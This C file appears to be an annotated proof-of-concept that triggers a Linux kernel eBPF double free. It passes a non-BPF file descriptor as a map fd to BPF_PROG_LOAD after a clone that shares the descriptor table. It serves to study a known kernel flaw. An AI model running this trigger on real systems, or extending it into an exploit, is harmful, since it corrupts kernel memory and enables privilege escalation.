#define _GNU_SOURCE
#include <errno.h>
#include <err.h>
#include <unistd.h>
#include <fcntl.h>
#include <sched.h>
#include <signal.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/syscall.h>
#include <sys/prctl.h>
#include <linux/bpf.h>


#ifndef __NR_bpf
# if defined(__i386__)
#  define __NR_bpf 357
# elif defined(__x86_64__)
#  define __NR_bpf 321
# elif defined(__aarch64__)
#  define __NR_bpf 280
# else
#  error
# endif
#endif

int map_fd;

int task(void* arg) {
    prctl(PR_SET_PDEATHSIG, SIGKILL);
    while (1) sleep(1);
}

int main(void) {
    /*
        SOURCE: http://man7.org/linux/man-pages/man2/open.2.html
        The return value of open() is a file descriptor, a small, nonnegative
        integer that is used in subsequent system calls (read(2), write(2),
        lseek(2), fcntl(2), etc.) to refer to the open file. The file
        descriptor returned by a successful call will be the lowest-numbered
        file descriptor not currently open for the process.
    */
    map_fd = open("./tmp/read-only", O_RDONLY);

    /*
        SOURCE: http://man7.org/linux/man-pages/man2/clone.2.html
        By contrast with fork(2), these system calls provide more precise
        control over what pieces of execution context are shared between the
        calling process and the child process.  For example, using these
        system calls, the caller can control whether or not the two processes
        share the virtual address space, the table of file descriptors, and
        the table of signal handlers.  These system calls also allow the new
        child process to be placed in separate namespaces(7).
    */
    char child_stack[20000];
	int child = clone(task, child_stack + sizeof(child_stack), CLONE_FILES | SIGCHLD, NULL);

    /*
        struct bpf_insn {
            __u8	code;		/* opcode 
            __u8	dst_reg:4;	/* dest register 
            __u8	src_reg:4;	/* source register 
            __s16	off;		/* signed offset 
            __s32	imm;		/* signed immediate constant  -- should refer to a valid bpf file
        };
    */
    // an array that contains 2 elements of bpf_insn instructions
    struct bpf_insn insns[2] = {
        {
            .code = BPF_LD | BPF_IMM | BPF_DW,
            .src_reg = BPF_PSEUDO_MAP_FD,
            .imm = map_fd // map_fd is not actually a valid bpf program, but we are using it as if it is a bpf program
        },
        {}
    };

    // https://elixir.bootlin.com/linux/v4.5.4/source/include/uapi/linux/bpf.h#L101
    union bpf_attr attr = {
        .prog_type = BPF_PROG_TYPE_SOCKET_FILTER,
        .insn_cnt = 2,
        .insns = (__aligned_u64) insns,
        .license = (__aligned_u64)""
    };

    // double free occurs here
    syscall(__NR_bpf, BPF_PROG_LOAD, &attr, sizeof(attr));

    int dummy_fd = open("./tmp/write-only", O_WRONLY);
    const void *buf[10];

    read(map_fd, buf, 1);
}
